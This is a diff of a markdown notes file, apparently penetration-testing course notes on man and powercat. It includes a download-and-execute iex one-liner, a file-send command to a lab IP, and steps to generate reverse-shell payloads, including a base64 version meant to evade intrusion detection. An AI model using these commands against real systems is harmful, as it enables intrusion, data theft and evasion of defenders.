@@ -1,4 +1,4 @@
-# linux-tips
+# linux-tips + pwk course contents
 
 ### `man`
 - Keyword search in all man pages: `man -k keyword`
@@ -195,7 +195,7 @@ The installation process places the script `powercat.ps1` at `/usr/share/windows
 
 Tip: It is also possible to download the powercat script and run it using`iex`: ```iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')```
 
-### Send file
+#### Send file
 ```
 powercat -c 10.0.2.15 -p 4445 -i /path/to/file/to/send
 ```
@@ -207,3 +207,20 @@ powercat -c 10.0.2.15 -p 4445 -i /path/to/file/to/send
 
 `-l` is for listening and perform all the opposite actions :)
 
+#### Generation of powershell payloads
+Use `-g` to generate the powershell payload:
+```
+powercat -c 10.0.2.15 -p 4445 -e cmd.exe -g > connect.ps1
+```
+
+When executed from powershell, the script will connect to the attacker and bind a shell. The problem with this type of payload generation is that any intrusion detection system (IDS) would detect it.
+
+Use `-ge` to generate a base64 encoded payload instead:
+```
+powercat -c 10.0.2.15 -p 4445 -e cmd.exe -ge > connect_base64.ps1
+```
+
+Then execute it passing directly the encoded string to powershell using the -E flag:
+```
+powershell -E {{paste the base64 encoded payload}}
+```
